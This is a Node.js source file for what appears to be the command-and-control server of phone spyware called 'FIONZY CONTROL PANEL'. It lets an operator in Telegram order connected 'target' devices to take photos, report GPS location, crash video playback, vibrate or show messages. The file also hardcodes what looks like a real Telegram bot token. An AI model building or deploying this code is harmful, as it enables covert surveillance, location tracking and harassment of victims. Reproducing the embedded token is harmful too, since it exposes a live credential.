const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

// === ⚡ KONFIGURASI ⚡ ===
const BOT_TOKEN = '8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA'; 
const bot = new Telegraf(BOT_TOKEN);
const MY_ID = '7373392803'; 

// Menu HTML (Anti-Error Karakter)
const mainMenu = async (ctx) => {
    const text = `<b>⚡ FIONZY CONTROL PANEL v14.0 ⚡</b>\n` +
                 `--------------------------------------\n` +
                 `📱 <b>Status:</b> ONLINE\n` +
                 `👹 <b>Target:</b> LOCKED\n` +
                 `--------------------------------------\n` +
                 `<i>Silahkan pilih eksekusi:</i>`;
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('📸 Take Photo', 'snap'), Markup.button.callback('📍 Track GPS', 'gps')],
        [Markup.button.callback('💀 Crash Video', 'crash'), Markup.button.callback('📳 Vibrate', 'vibrate')],
        [Markup.button.callback('💬 Send Toast', 'ask_toast'), Markup.button.callback('🔄 Refresh', 'menu')]
    ]);

    try {
        await ctx.reply(text, { parse_mode: 'HTML', ...keyboard });
    } catch (e) { ctx.reply("PANEL v14.0 READY", keyboard); }
};

io.on('connection', (socket) => {
    console.log('⚡ Target Terhubung!');
});

bot.start((ctx) => mainMenu(ctx));
bot.command('menu', (ctx) => mainMenu(ctx));

// Perintah Socket.io
bot.action('snap', (ctx) => { ctx.answerCbQuery('📸 Memotret...').catch(() => {}); io.emit('command', '/snap'); });
bot.action('gps', (ctx) => { ctx.answerCbQuery('📍 Melacak...').catch(() => {}); io.emit('command', '/gps'); });
bot.action('vibrate', (ctx) => { ctx.answerCbQuery('📳 Bergetar!').catch(() => {}); io.emit('command', '/vibrate'); });
bot.action('crash', (ctx) => { ctx.answerCbQuery('💀 Eksekusi Devil Video!').catch(() => {}); io.emit('command', '/crash'); });
bot.action('menu', (ctx) => mainMenu(ctx));
bot.action('ask_toast', (ctx) => ctx.reply("Ketik: /toast [pesan]"));

bot.on('text', (ctx) => {
    if (ctx.message.text.startsWith('/toast ')) {
        io.emit('command', ctx.message.text);
        ctx.reply("✅ Pesan Terkirim!");
    }
});

server.listen(3000, '0.0.0.0', () => { console.log('⚡ FIONZY SERVER v14.0 LIVE'); });
bot.launch();
